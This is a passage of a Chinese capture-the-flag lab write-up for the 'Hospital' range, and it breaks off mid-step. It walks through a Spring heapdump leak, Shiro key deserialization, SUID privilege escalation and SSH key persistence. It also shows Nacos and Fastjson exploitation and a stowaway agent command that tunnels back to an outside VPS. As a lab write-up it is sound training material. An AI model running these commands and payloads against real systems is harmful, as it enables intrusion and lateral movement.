{"pageProps":{"postData":{"id":"春秋云镜Hospital","contentHtml":"<h1>Hospital</h1>\n<blockquote>\n<p><a href=\"https://yunjing.ichunqiu.com/major/detail/1106?type=1\">https://yunjing.ichunqiu.com/major/detail/1106?type=1</a></p>\n</blockquote>\n<p>在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。</p>\n<p>39.99.226.73</p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/hospital  nmap -sT -min-rate 10000 -p- 39.99.226.73   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-10 02:33 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 39.99.226.73\nHost is up (0.013s latency).\nNot shown: 65531 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n25/tcp   open  smtp\n53/tcp   open  domain\n110/tcp  open  pop3\n8080/tcp open  http-proxy\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 19.94 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/hospital  nmap -sT -A -T4 -O -p 25,53,110,8080 39.99.226.73    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-10 02:34 EDT\nStats: 0:02:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 75.00% <span class=\"hljs-keyword\">done</span>; ETC: 02:37 (0:00:42 remaining)\nNmap scan report <span class=\"hljs-keyword\">for</span> 39.99.226.73\nHost is up (0.013s latency).\n\nPORT     STATE SERVICE    VERSION\n25/tcp   open  tcpwrapped\n|_smtp-commands: Couldn<span class=\"hljs-string\">'t establish connection on port 25\n53/tcp   open  domain?\n110/tcp  open  tcpwrapped\n8080/tcp open  http-proxy\n| http-title: \\xE5\\x8C\\xBB\\xE7\\x96\\x97\\xE7\\xAE\\xA1\\xE7\\x90\\x86\\xE5\\x90\\x8E\\xE5\\x8F\\xB0\n|_Requested resource was http://39.99.226.73:8080/login;jsessionid=7D5532F970DC58645801CB456EF9C439\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 302 \n|     Set-Cookie: JSESSIONID=8658DE9BD5180DDE29E15CB1EA0CA3A3; Path=/; HttpOnly\n|     Location: http://localhost:8080/login;jsessionid=8658DE9BD5180DDE29E15CB1EA0CA3A3\n|     Content-Length: 0\n|     Date: Thu, 10 Apr 2025 06:35:01 GMT\n|     Connection: close\n|   GetRequest: \n|     HTTP/1.1 302 \n|     Set-Cookie: JSESSIONID=6282B5CD8CC24B824D0919FC37848D74; Path=/; HttpOnly\n|     Location: http://localhost:8080/login;jsessionid=6282B5CD8CC24B824D0919FC37848D74\n|     Content-Length: 0\n|     Date: Thu, 10 Apr 2025 06:35:01 GMT\n|     Connection: close\n|   HTTPOptions: \n|     HTTP/1.1 302 \n|     Set-Cookie: JSESSIONID=003EEA4A0C76659AEFD8C6FF6B94D73B; Path=/; HttpOnly\n|     Location: http://localhost:8080/login;jsessionid=003EEA4A0C76659AEFD8C6FF6B94D73B\n|     Content-Length: 0\n|     Date: Thu, 10 Apr 2025 06:35:01 GMT\n|     Connection: close\n|   RTSPRequest: \n|     HTTP/1.1 505 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 465\n|     Date: Thu, 10 Apr 2025 06:35:01 GMT\n|     &#x3C;!doctype html>&#x3C;html lang=\"en\">&#x3C;head>&#x3C;title>HTTP Status 505 \n|     HTTP Version Not Supported&#x3C;/title>&#x3C;style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&#x3C;/style>&#x3C;/head>&#x3C;body>&#x3C;h1>HTTP Status 505 \n|     HTTP Version Not Supported&#x3C;/h1>&#x3C;/body>&#x3C;/html>\n|   Socks5: \n|     HTTP/1.1 400 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Thu, 10 Apr 2025 06:35:01 GMT\n|     Connection: close\n|     &#x3C;!doctype html>&#x3C;html lang=\"en\">&#x3C;head>&#x3C;title>HTTP Status 400 \n|     Request&#x3C;/title>&#x3C;style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&#x3C;/style>&#x3C;/head>&#x3C;body>&#x3C;h1>HTTP Status 400 \n|_    Request&#x3C;/h1>&#x3C;/body>&#x3C;/html>\n|_http-trane-info: Problem with XML parsing of /evox/about\n\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: WAP\nRunning: Actiontec embedded, Linux\nOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel\nOS details: Actiontec MI424WR-GEN3I WAP\nNetwork Distance: 16 hops\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 186.32 seconds\n</span></code></pre>\n<p><code>fscan</code> 扫描</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/Tools  ./fscan_1.8.4 -h 39.99.226.73 \n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n39.99.226.73:8080 open\n[*] alive ports len is: 1\nstart vulscan\n[*] WebTitle http://39.99.226.73:8080  code:302 len:0      title:None 跳转url: http://39.99.226.73:8080/login;jsessionid=637A12B5B7D04CD31B9B6DB1939CC093\n[*] WebTitle http://39.99.226.73:8080/login;jsessionid=637A12B5B7D04CD31B9B6DB1939CC093 code:200 len:2005   title:医疗管理后台\n[+] PocScan http://39.99.226.73:8080 poc-yaml-spring-actuator-heapdump-file \n已完成 1/1\n[*] 扫描结束,耗时: 20.152215581s\n</span></code></pre>\n<h2>Web 渗透</h2>\n<h3>spring-actuator-heapdump-file</h3>\n<p>发现存在 <code>spring-actuator-heapdump-file</code></p>\n<p>那么就将<code>heapdump</code> 文件下载下来</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/hospital  wget http://39.99.226.73:8080/actuator/heapdump                                  \n--2025-04-10 02:49:29--  http://39.99.226.73:8080/actuator/heapdump\n正在连接 39.99.226.73:8080... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 \n长度：29135811 (28M) [application/octet-stream]\n正在保存至: “heapdump”\n\nheapdump                                                 100%[==================================================================================================================================>]  27.79M  1.20MB/s  用时 20s     \n\n2025-04-10 02:49:49 (1.41 MB/s) - 已保存 “heapdump” [29135811/29135811])\n</code></pre>\n<p>使用<code>JDumpSpider</code>来读取敏感信息</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/hospital  java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump     \n.....\n===========================================                                                                                                                                                                                         \nCookieRememberMeManager(ShiroKey)                                                                                                                                                                                                   \n-------------                                                                                                     \nalgMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES                                                                                                                                                                        \n                                                                                                                  \n===========================================          \n.....\n</code></pre>\n<h3>Shiro 漏洞利用</h3>\n<p>读到了<code>Shiro</code>的<code>key</code>，想验证一下是否存在<code>Shiro</code>漏洞</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image.png\" alt=\"image.png\"></p>\n<p>存在，直接梭哈</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image1.png\" alt=\"image.png\"></p>\n<p>冰蝎连接成功</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image2.png\" alt=\"image.png\"></p>\n<h2>172.30.12.5</h2>\n<h3>SUID 提权</h3>\n<p>将 <code>Shell</code> 弹到VPS上</p>\n<pre><code class=\"hljs language-bash\">python3 -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/bash')\"</span>\n</code></pre>\n<p>拿到<code>shell</code>第一时间写入公钥，方便后面登录</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"ssh-rsa xxxxxx\"</span> > .ssh/authorized_keys\n</code></pre>\n<p>寻找是否存在 <code>SUID</code> 权限的可执行文件</p>\n<pre><code class=\"hljs language-bash\">find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null\n/usr/bin/vim.basic\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/staprun\n/usr/bin/at\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/stapbpf\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/fusermount\n/usr/bin/mount\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n</code></pre>\n<p>发现可以<code>vim</code>拥有SUID，因为 flag不在根目录，所以就应该在 root下</p>\n<pre><code class=\"hljs language-bash\">vim /root/flag/flag01.txt\n</code></pre>\n<pre><code class=\"hljs language-bash\">O))     O))                              O))             O))\nO))     O))                          O)  O))             O))\nO))     O))   O))     O)))) O) O))     O)O) O)   O))     O))\nO)))))) O)) O))  O)) O))    O)  O)) O))  O))   O))  O))  O))\nO))     O))O))    O))  O))) O)   O))O))  O))  O))   O))  O))\nO))     O)) O))  O))     O))O)) O)) O))  O))  O))   O))  O))\nO))     O))   O))    O)) O))O))     O))   O))   O)) O)))O)))\n                            O))\nflag01: flag{c5271ec6-872c-4bc6-ab91-dd6651b9caad}\n</code></pre>\n<h3>搭建代理</h3>\n<p>首先查看一手内网<code>IP</code> ，内网网段<code>172.30.12.x</code></p>\n<pre><code class=\"hljs language-bash\">ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 00:16:3e:05:a2:90 brd ff:ff:ff:ff:ff:ff\n    inet 172.30.12.5/16 brd 172.30.255.255 scope global dynamic eth0\n       valid_lft 315357620sec preferred_lft 315357620sec\n    inet6 fe80::216:3eff:fe05:a290/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>使用<code>stowaway</code>来搭建代理，靶机上传<code>stowaway</code> 客户端</p>\n<pre><code class=\"hljs language-bash\">// VPS \n./linux_x64_admin -l 8080 -s 123123\n// 靶机\n./linux_x64_agent -c 8.134.163.255:8080 -s 123123 -reconnect 8 &#x26;\n</code></pre>\n<p>连上后，在服务端操作开<code>socks</code>代理</p>\n<pre><code class=\"hljs language-bash\">(admin) >> detail\nNode[0] -> IP: 39.99.226.73:52592  Hostname: web01  User: app\nMemo: \n\n(admin) >> use 0\n\n(node 0) >> socks 2096 admin 123456\n[*] Trying to listen on 0.0.0.0:2096......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Socks start successfully!\n</span></code></pre>\n<p>进行测试，Kali上使用<code>proxychains4</code></p>\n<pre><code class=\"hljs language-bash\">vim /etc/proxychains4.conf\nsocks5  8.134.163.255   2096    admin   123456\n</code></pre>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/hospital  proxychains curl 172.30.12.5:8080/login                                 \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                            \n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  8.134.163.255:2096  ...  172.30.12.5:8080  ...  OK                               \n&#x3C;!DOCTYPE html>                                          \n&#x3C;html>                                     \n&#x3C;<span class=\"hljs-built_in\">head</span>>          \n    &#x3C;title>医疗管理后台&#x3C;/title>\n   ......\n</code></pre>\n<h3>内网探测</h3>\n<p>上传 <code>fscan</code>进行内网网段<code>172.30.12.x</code>扫描</p>\n<pre><code class=\"hljs language-bash\">start infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.30.12.5     is alive\n(icmp) Target 172.30.12.6     is alive\n(icmp) Target 172.30.12.236   is alive\n[*] Icmp alive hosts len is: 3\n172.30.12.6:139 open\n172.30.12.6:135 open\n172.30.12.236:22 open\n172.30.12.5:22 open\n172.30.12.236:8080 open\n172.30.12.5:8080 open\n172.30.12.6:8848 open\n172.30.12.236:8009 open\n172.30.12.6:445 open\n[*] alive ports len is: 9\nstart vulscan\n[*] NetBios 172.30.12.6     WORKGROUP\\SERVER02            \n[*] NetInfo \n[*]172.30.12.6\n   [->]Server02\n   [->]172.30.12.6\n[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台\n[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found\n[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=B1295058310914FB008CE8E49BF23E4F\n[*] WebTitle http://172.30.12.5:8080/login;jsessionid=B1295058310914FB008CE8E49BF23E4F code:200 len:2005   title:医疗管理后台\n[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos \n[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass \n[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file \n</code></pre>\n<h2>172.30.12.6</h2>\n<h3>Nacos 漏洞探测</h3>\n<p>直接用工具进行检测</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image3.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image4.png\" alt=\"image.png\"></p>\n<p>使用用户<code>nacos:nacos</code>进行登录，成功进入后台</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image5.png\" alt=\"image.png\"></p>\n<p>使用工具注入内存马，但是连接不成功，后面尝试了哥斯拉的也一样</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image6.png\" alt=\"image.png\"></p>\n<h3>Nacos Client Yaml 反序列化</h3>\n<p>那么还可以尝试 Nacos Client Yaml 反序列化漏洞</p>\n<blockquote>\n<p><a href=\"https://h0ny.github.io/posts/Nacos-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/#nacos-client-yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\">https://h0ny.github.io/posts/Nacos-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/#nacos-client-yaml-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p>\n</blockquote>\n<blockquote>\n<p>工具链接：<a href=\"https://github.com/artsploit/yaml-payload\">https://github.com/artsploit/yaml-payload</a></p>\n</blockquote>\n<p>下载之后打包成 <code>jar</code> 包</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~/Desktop/test/hospital  /usr/local/jdk1.8.0_202/bin/javac yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class=\"hljs-literal\">true</span>\n ⚡ root@kali  ~/Desktop/test/hospital  jar -cvf yaml-payload.jar -C yaml-payload/src/ .\nadding: META-INF/ (<span class=\"hljs-keyword\">in</span>=0) (out=0) (stored 0%)\nadding: META-INF/MANIFEST.MF (<span class=\"hljs-keyword\">in</span>=56) (out=56) (stored 0%)\nadding: ./ (<span class=\"hljs-keyword\">in</span>=0) (out=0) (stored 0%)\nadding: META-INF/ (<span class=\"hljs-keyword\">in</span>=0) (out=0) (stored 0%)\nadding: META-INF/services/ (<span class=\"hljs-keyword\">in</span>=0) (out=0) (stored 0%)\nadding: META-INF/services/javax.script.ScriptEngineFactory (<span class=\"hljs-keyword\">in</span>=36) (out=38) (deflated -5%)\nadding: artsploit/ (<span class=\"hljs-keyword\">in</span>=0) (out=0) (stored 0%)\nadding: artsploit/AwesomeScriptEngineFactory.class (<span class=\"hljs-keyword\">in</span>=1698) (out=715) (deflated 57%)\nadding: artsploit/AwesomeScriptEngineFactory.java (<span class=\"hljs-keyword\">in</span>=1589) (out=427) (deflated 73%)\nTotal:\n------\n(<span class=\"hljs-keyword\">in</span> = 3363) (out = 2328) (deflated 30%)\n</code></pre>\n<p>Nacos的<code>dataid</code>为<code>db-config</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image5.png\" alt=\"image.png\"></p>\n<p>因为内网机器不出网，所以我们要将<code>jar</code>包上传到靶机（172.30.12.5）上，然后在靶机上开启<code>HTTP</code>服务</p>\n<pre><code class=\"hljs language-bash\">python3 -m http.server 1234\n</code></pre>\n<p>可以看到内网服务器收到请求了，说明存在该漏洞</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image7.png\" alt=\"image.png\"></p>\n<p>那么我们需要修改一下<code>payload</code>文件，原本的<code>payload</code>只是弹计算器，但是对于我们没有用，我们将其改为添加一个管理员用户</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image8.png\" alt=\"image.png\"></p>\n<p>再打包一次</p>\n<pre><code class=\"hljs language-bash\">/usr/local/jdk1.8.0_202/bin/javac yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java\njar -cvf yaml-payload2.jar -C yaml-payload/src/ .                                           \n</code></pre>\n<p>再次上传 <code>jar</code> 包，再打一次</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image9.png\" alt=\"image.png\"></p>\n<p>之后可以通过<code>RDP</code>进行远程桌面登录，可以通过<code>nxe</code>扫出来</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image10.png\" alt=\"image.png\"></p>\n<p><code>administrator</code>家目录下能找到<code>flag02</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image11.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">flag02: flag{e2500721-804b-4e8a-978d-aa37743d9f9b}\n</code></pre>\n<h3>信息收集</h3>\n<p>查看域内用户信息，但是貌似不存在域</p>\n<pre><code class=\"hljs language-bash\">C:\\Users\\sunset>net user /domain\n这项请求将在域 WORKGROUP 的域控制器处理。\n\n发生系统错误 1355。\n\n指定的域不存在，或无法联系。\n</code></pre>\n<h2>172.30.12.236</h2>\n<p><code>fscan</code> 有扫描到</p>\n<pre><code class=\"hljs language-bash\">[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台\n</code></pre>\n<p>访问一下</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image12.png\" alt=\"image.png\"></p>\n<p>尝试对其进行密码爆破，失败</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image13.png\" alt=\"image.png\"></p>\n<p>目录爆破，扫出来的目录像是 <code>tomcat</code> 的</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/hospital  proxychains4 -q dirsearch -u http://172.30.12.236:8080 -x 403,404,429 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/hospital/reports/http_172.30.12.236_8080/_25-04-10_04-59-22.txt\n\nTarget: http://172.30.12.236:8080/\n\n[04:59:22] Starting: \n[04:59:30] 405 -    1KB - /;/login\n[04:59:30] 400 -    0B  - /\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd\n[04:59:31] 400 -    0B  - /a%5c.aspx\n[04:59:47] 302 -    0B  - /docs  ->  /docs/\n[04:59:47] 200 -   17KB - /docs/\n[04:59:49] 302 -    0B  - /examples  ->  /examples/\n[04:59:49] 200 -    1KB - /examples/\n[04:59:49] 200 -    6KB - /examples/servlets/index.html\n[04:59:49] 200 -  734B  - /examples/servlets/servlet/CookieExample\n[04:59:49] 200 -  722B  - /examples/jsp/snp/snoop.jsp\n[04:59:49] 200 -   14KB - /examples/jsp/index.html\n[04:59:49] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample\n[04:59:49] 200 -    1KB - /examples/websocket/index.xhtml\n[04:59:57] 405 -    1KB - /login\n[04:59:58] 302 -    0B  - /manager  ->  /manager/\n\nTask Completed\n</code></pre>\n<p>访问 <code>docs</code> ，可以看到 <code>Tomcat</code>版本是<code>8.5.32</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image14.png\" alt=\"image.png\"></p>\n<p>到这里一般都会想到后台<code>getshell</code> （打过的一台靶机：<strong>Corrosion: 2</strong>），但是拒绝访问了</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image15.png\" alt=\"image.png\"></p>\n<h3>Fastjson 漏洞检测</h3>\n<p>在登录页面测试，可以看到是传JSON的，测试一下是否存在<code>Fastjson</code>漏洞，看到报错带有<code>Fastjson</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image16.png\" alt=\"image.png\"></p>\n<p>检测漏洞，没报错，版本应该是<code>1.2.47</code> ：<a href=\"https://github.com/safe6Sec/Fastjson\">https://github.com/safe6Sec/Fastjson</a></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image17.png\" alt=\"image.png\"></p>\n<h3>Fastjson 漏洞利用</h3>\n<p>使用手动<code>Jndi_Tool</code>没法成功（不知道哪里出了问题，尝试了几遍），所以这里直接使用Burp的插件<code>Fastjson-exp</code> 直接注入内存马</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image18.png\" alt=\"image.png\"></p>\n<p>使用哥斯拉进行连接</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image19.png\" alt=\"image.png\"></p>\n<p>是<code>root</code>权限</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image20.png\" alt=\"image.png\"></p>\n<p>写入公钥，方便后面登录</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"ssh-rsa xxxxxx\"</span> > .ssh/authorized_keys\n</code></pre>\n<p>在root目录下能拿到<code>flag03.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@web03:~/flag# <span class=\"hljs-built_in\">cat</span> flag03.txt \n /$$   /$$                               /$$   /$$               /$$\n| $$  | $$                              |__/  | $$              | $$\n| $$  | $$  /$$$$$$   /$$$$$$$  /$$$$$$  /$$ /$$$$$$    /$$$$$$ | $$\n| $$$$$$$$ /$<span class=\"hljs-variable\">$__</span>  $$ /$<span class=\"hljs-variable\">$_____</span>/ /$<span class=\"hljs-variable\">$__</span>  $$| $$|_  $<span class=\"hljs-variable\">$_</span>/   |____  $$| $$\n| $<span class=\"hljs-variable\">$__</span>  $$| $$  \\ $$|  $$$$$$ | $$  \\ $$| $$  | $$      /$$$$$$$| $$\n| $$  | $$| $$  | $$ \\____  $$| $$  | $$| $$  | $$ /$$ /$<span class=\"hljs-variable\">$__</span>  $$| $$\n| $$  | $$|  $$$$$$/ /$$$$$$$/| $$$$$$$/| $$  |  $$$$/|  $$$$$$$| $$\n|__/  |__/ \\______/ |_______/ | $<span class=\"hljs-variable\">$____</span>/ |__/   \\___/   \\_______/|__/\n                              | $$                                  \n                              | $$                                  \n                              |__/                                  \nflag03: flag{f2ba2c59-a4dc-4ea3-8036-037d1288fea6}\n</code></pre>\n<h3>信息收集</h3>\n<p>双网卡主机，发现另外一个网段<code>172.30.54.x</code></p>\n<pre><code class=\"hljs language-bash\">root@web03:~# ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 00:16:3e:15:d0:ba brd ff:ff:ff:ff:ff:ff\n    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0\n       valid_lft 315357374sec preferred_lft 315357374sec\n    inet6 fe80::216:3eff:fe15:d0ba/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n3: eth1: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 00:16:3e:15:d0:6a brd ff:ff:ff:ff:ff:ff\n    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe15:d06a/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>上传 <code>fscan</code> 进行扫描，新靶机开启着<code>5432</code>端口，是<code>PostgreSQL</code></p>\n<pre><code class=\"hljs language-bash\">root@web03:~# ./fscan_1.8.4 -h 172.30.54.1-255\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 172.30.54.12    is alive\n(icmp) Target 172.30.54.179   is alive\n[*] Icmp alive hosts len is: 2\n172.30.54.179:22 open\n172.30.54.179:8009 open\n172.30.54.12:22 open\n172.30.54.12:3000 open\n172.30.54.12:5432 open\n172.30.54.179:8080 open\n[*] alive ports len is: 6\nstart vulscan\n[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login\n[*] WebTitle http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台\n[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana\n</span></code></pre>\n<h3>二层代理搭建</h3>\n<p>回到 VPS（隧道服务端）设置（<code>node 0</code> 是之前第一层代理）监听 <code>10000</code> 端口（在<code>172.30.12.5</code>中监听<code>10000</code>端口）</p>\n<pre><code class=\"hljs language-bash\">(node 0) >> listen\n[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you<span class=\"hljs-string\">'re controlling was started in the corresponding way!\n[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!\n[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1\n[*] Please input the [ip:]&#x3C;port> : 10000\n[*] Waiting for response......\n[*] Node is listening on 10000\n</span></code></pre>\n<p>上传<code>stowaway</code> 客户端到 <code>web03</code> ，并连接 <code>172.30.12.5:10000</code></p>\n<pre><code class=\"hljs language-bash\">root@web03:~# ./linux_x64_agent -c 172.30.12.5:10000 -s 123123 --reconnect 8\n2025/04/15 20:40:12 [*] Starting agent node actively.Connecting to 172.30.12.5:10000.Reconnecting every 8 seconds\n</code></pre>\n<p>服务端接收到新节点</p>\n<pre><code class=\"hljs language-bash\">(node 0) >> \n[*] New node online! Node <span class=\"hljs-built_in\">id</span> is 1\n</code></pre>\n<pre><code class=\"hljs language-bash\">(admin) >> detail\nNode[0] -> IP: 39.99.227.193:36978  Hostname: web01  User: app\nMemo: \n\nNode[1] -> IP: 172.30.12.236:52454  Hostname: web03  User: root\nMemo:\n</code></pre>\n<p>设置 